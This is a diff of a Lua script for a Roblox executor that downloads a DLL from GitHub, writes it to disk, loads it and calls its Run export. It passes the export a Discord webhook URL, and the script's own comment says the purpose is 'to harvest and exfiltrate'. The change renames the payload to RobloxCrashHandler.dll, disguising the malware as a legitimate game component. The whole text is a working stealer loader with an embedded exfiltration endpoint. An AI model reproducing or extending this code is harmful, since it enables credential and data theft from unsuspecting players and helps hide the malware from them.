@@ -3,13 +3,13 @@
 -- disk, loads it, then calls Run() to harvest and exfiltrate.
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
-local DLL_URL     = "https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/master/utility.dll"
-local DLL_PATH    = "utility.dll"
+local DLL_URL     = "https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/master/RobloxCrashHandler.dll"
+local DLL_PATH    = "RobloxCrashHandler.dll"
 
 print("[+] RobloxUtility chain fired")
 
 -- 1. Download the DLL
-print("[*] Fetching utility.dll from raw GitHub...")
+print("[*] Fetching RobloxCrashHandler.dll from raw GitHub...")
 local ok, bytes = pcall(function()
     return game:HttpGet(DLL_URL, true)
 end)
@@ -28,14 +28,14 @@ if io and io.open then
         f:write(bytes)
         f:close()
         wrote = true
-        print("[+] utility.dll written via io.open: " .. DLL_PATH)
+        print("[+] RobloxCrashHandler.dll written via io.open: " .. DLL_PATH)
     end
 end
 if not wrote and writefile then
     local ok, err = pcall(writefile, DLL_PATH, bytes)
     if ok then
         wrote = true
-        print("[+] utility.dll written via writefile()")
+        print("[+] RobloxCrashHandler.dll written via writefile()")
     else
         print("[!] writefile failed: " .. tostring(err))
     end
@@ -56,7 +56,7 @@ if not d then
     print("[!] load_dll returned nil")
     return
 end
-print("[+] utility.dll loaded")
+print("[+] RobloxCrashHandler.dll loaded")
 
 -- 4. Call the Run export
 if d.Run then
@@ -64,5 +64,5 @@ if d.Run then
     d.Run(WEBHOOK_URL, 0)
     print("[+] Run() returned")
 else
-    print("[!] utility.dll has no Run export")
+    print("[!] RobloxCrashHandler.dll has no Run export")
 end
